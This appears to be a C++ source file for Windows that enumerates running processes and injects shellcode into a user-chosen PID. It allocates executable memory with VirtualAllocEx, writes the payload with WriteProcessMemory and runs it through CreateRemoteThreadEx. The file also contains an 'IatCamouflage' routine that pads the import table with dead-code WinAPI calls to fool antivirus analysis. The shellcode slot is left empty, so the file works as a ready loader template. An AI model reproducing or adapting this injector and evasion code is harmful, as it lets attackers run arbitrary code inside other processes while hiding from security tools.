#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <shlobj.h>

using namespace std;

void printProcessNameAndID(DWORD processID) 
{
    TCHAR szProcessName[MAX_PATH] = TEXT("<uinknown>"); //store process name. An array. MAX_PATH is the max length of a path.

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID); //open the process using its processID

    if (NULL != hProcess) 
    {
        HMODULE hMod; //handle to a module, ex: an exe file within a process
        DWORD cbNeeded; //the memory size needed to store module info 

        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) 
        {
            GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
        }
    }

    _tprintf(TEXT("%s  (PID: %u)\n"), szProcessName, processID); //print process name + pid

    CloseHandle(hProcess); //close handle
}

int findProcess() 
{
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    //gets the process IDs of all running processes
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) 
    {
        return 1;
    }

    cProcesses = cbNeeded / sizeof(DWORD); //calculate number of processes

    for (i = 0; i < cProcesses; i++) 
    {
        if (aProcesses[i] != 0)  //if the process ID is valid
        {
            printProcessNameAndID(aProcesses[i]); //print process name and ID (call la func)
        }
    }

    return 0;
}

void inject(DWORD pid) 
{
    unsigned char wannabe[] =
        ""; //shellcode here
    HANDLE hProcess; 
    DWORD dwProcessId = pid; //le pid

    hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwProcessId); //open le process pour écriture

    if (hProcess == NULL) 
    {
        cout << "\nUnable to Identify the Process ID\n";
        return;
    }

    SIZE_T dwSize = sizeof(wannabe); // Calculate the size of the shellcode to be injected
    DWORD flAllocationType = (MEM_COMMIT | MEM_RESERVE);  // Memory allocation flags
    DWORD flProtect = PAGE_EXECUTE_READWRITE; // Set memory protection to execute,read, and write

    LPVOID lpAlloc = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect); //allocate memory in the process, to store the shellcode
    if (lpAlloc == NULL) 
    {
        printf("\nFailed to Allocate the memory\n");
        DWORD dwError = GetLastError();
        printf("Error Code: %lu\n", dwError);
        CloseHandle(hProcess);
        return;
    }
    printf("Allocated the memory into virtual space\n");

    LPVOID lpBaseAddress = lpAlloc; //address for the allocated memory
    LPCVOID lpBuffer = wannabe; //set the shellcode as the buffer to wrtie
    SIZE_T nSize = sizeof(wannabe); //size of shellcode
    SIZE_T lpNumberOfBytesWritten; //store numberofBytes written

    BOOL bWriteBuffer = WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, &lpNumberOfBytesWritten); //write the shellcode in the memory

    if (bWriteBuffer == FALSE) 
    {
        DWORD dwError = GetLastError();
        printf("Failed to Write Memory to the process. Error Code: %lu\n", dwError);
        CloseHandle(hProcess);
        return;
    }

    printf("Successfully wrote memory to the process\n");

    //params for creating the thread (which will execute the code)
    LPSECURITY_ATTRIBUTES lpThreadAttributes = NULL;
    SIZE_T dwStackSize = 0;
    LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE)lpAlloc;
    LPVOID lpParameter = NULL;
    DWORD dwCreationFlags = 0;
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = 0;
    LPDWORD lpThreadId = NULL;

    //create the thread
    HANDLE hThread = CreateRemoteThreadEx(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpAttributeList, lpThreadId);

    if (hThread == NULL) 
    {
        DWORD dwError = GetLastError();
        printf("Failed to create remote thread. Error Code: %lu\n", dwError);
        CloseHandle(hProcess);
        return;
    }

    //wait for the thread to finish executing
    WaitForSingleObject(hThread, INFINITE);

    printf("Successfully injected into process %lu\n", pid);

    CloseHandle(hThread); //close thread
    CloseHandle(hProcess); //close handle to process
}

int RandomCompileTimeSeed(void)
{
	return '0' * -40271 +
		__TIME__[7] * 1 +
		__TIME__[6] * 10 +
		__TIME__[4] * 60 +
		__TIME__[3] * 600 +
		__TIME__[1] * 3600 +
		__TIME__[0] * 36000;
}

PVOID Helper(PVOID* ppAddress) {

	PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
	if (!pAddress)
		return NULL;

	// setting the first 4 bytes in pAddress to be equal to a random number (less than 255)
	*(int*)pAddress = RandomCompileTimeSeed() % 0xFF;

	// saving the base address by pointer, and returning it 
	*ppAddress = pAddress;
	return pAddress;
}

void AddKernel32ToIat() {
    // Calling a simple Kernel32.dll function: GetCurrentProcessId
    DWORD processID = GetCurrentProcessId();
    std::wcout << L"Current Process ID: " << processID << std::endl;
}

void IatCamouflage() {

	PVOID		pAddress = NULL;
	int* A = (int*)Helper(&pAddress);

	// Impossible if-statement that will never run
	if (*A > 350) {

		// some random whitelisted WinAPIs
		unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
		i = GetLastError();
		i = SetCriticalSectionSpinCount(NULL, NULL);
		i = GetWindowContextHelpId(NULL);
		i = GetWindowLongPtrW(NULL, NULL);
		i = RegisterClassW(NULL);
		i = IsWindowVisible(NULL);
		i = ConvertDefaultLocale(NULL);
		i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
		i = IsDialogMessageW(NULL, NULL);
	}

	// Freeing the buffer allocated in 'Helper'
	HeapFree(GetProcessHeap(), 0, pAddress);
}

int main() 
{
    IatCamouflage();

    AddKernel32ToIat();
    
    findProcess(); //print processes

    DWORD pid;
    cout << "Enter process ID: ";
    cin >> pid;

    inject(pid); //inject shellcode
}
